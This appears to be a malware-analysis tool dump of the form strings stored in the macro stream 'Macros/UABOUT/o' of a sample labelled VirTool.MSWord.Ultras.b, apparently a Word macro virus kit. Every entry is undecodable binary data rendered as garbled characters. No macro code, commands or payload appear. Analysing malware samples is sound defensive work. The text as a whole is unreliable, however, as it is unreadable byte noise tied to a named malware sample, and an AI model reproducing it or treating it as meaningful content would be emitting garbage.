- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{{|���ddf==@GGKggj���^^cbbheekffleej������TTXJJN??B336&&(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::;������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T``�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
迿����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������ꫫ������������������ꦦ�������������������������������PP�@@�PP៟�������������������������``}@@jPP}������������������������џ������������������������������������������������``�@@�PP؟��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������ɿ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������pp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J������@@w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S@@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,@@R������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
((+���??BJJN���aafmmr������kk�fg�lm�������TV�PR�LN�SU�������<@�9<�59�26�/3ԕ�����������/4�ei��DI�&+��������}��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�-2鬮�������be�37�9<�>A�gjŻ��RT�XZ�������no�qqxjjo���;;>���QQR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@Q���  n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x@@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z���@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`@@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0@@U������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&&(���<<?GGK���^^cjjo������ll�gh�������Z\�VX�st�MP�IL�\_����JM�:=�7:ə�旙����������36�������������������SV�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �8=�,1�!&�26�������15�69�`b�AD�GJ����TV�[\�������qq�mmr������447���LLM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@\���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]���@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�����㿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3@@W������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
##%���99<EEH���eejgglrrxrrmn�ii�������\]�WY����{}�KM�GJ�������<?�8<ǚ�����������6:����MQ�LP�<@�HL�*/�FJ����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"ꏑ�Y\�$)�',����cf�47�km����DG�JL�|}�bc�^_�ef�lm�ss|ffk������������FFG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@ȿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00Ϳ���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j���@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5@@Y������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!#���77:BBF������ddioouss~no�jk���Ͱ��]^�YZ����fh�LO�HK�������=@�:=�DF����������`c⮰�AE������� %�VZ����9>�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$琒�[^�'+�*.����eh�7:�mo����GJ�MO�~�����ab�hi�oo�ppv^^c������������AAD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!@@t00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@Կ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w���@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7@@[������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!���558@@C������aafllr���pp�kl�������������vw�RT�NP�ln����������<?�8<ǚ�������镘ꔖ�^a�������Y\� %���������!%�"'㑔�]`�*.�-1�������������QS�JM�PR���ʚ��de�kl����iinVV[������������@@J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@ڿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �޿������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8@@\������		

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
((*336nnq������^^ciio���qq�lm����������fg�WY�SU�Z]�������������=@�:=�DF������疘镗�RU����������#'�������Y\됓�$(�%*ߓ��_b�-1�14����������CE�HK�NP�tv�������gh�oo����``eNNR������������@@W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@ڿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9@@]������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BBD114<<?������\\aggl���rrww�������ab�]^�Y[�jl�������������������<?�9<ǧ�貴�~�����,0����������%*ຼ����\_蒔�'+�(-ە��be�04�48�����AD�FI�LN�}~����������kl�rr���XX\QQS������������@@e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@ڿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �޿������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8@@]������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���002::=������ZZ^ddj���ss}���������bd�^`�y{�������������vw�su����>A�;>�vx����LO����be�{~����ko�(,ܓ��y{铖�*.�,0ז��eh�48�8;����pr�EH�JL����������������oo�qqx���NNRmmo������������@@r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@ܿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ܿ�؏��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
700O������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���..199<������XX\bbg���tt|���������de�`a���悃�TV�}~����IL�FI����@C�=@�kn����hj٥�����be�,1�`c�RV�mp�RU௱��-1�/3Ә��gj�8;�;?����su�IK�NP����Y[�_`�������rr}iinwwzDDH���������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@ݿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00Ͽ������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``ƿ�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$$%--077:������aad``ejjpssz���������ef�ab�qs�de�VX�������KN�HK����BE�?B����������BDϘ��������������|�be�������15�36Κ��jm�;?�?B����LO�RT�wx�]^�cd�������xx^^cMMQ::=���������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@࿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
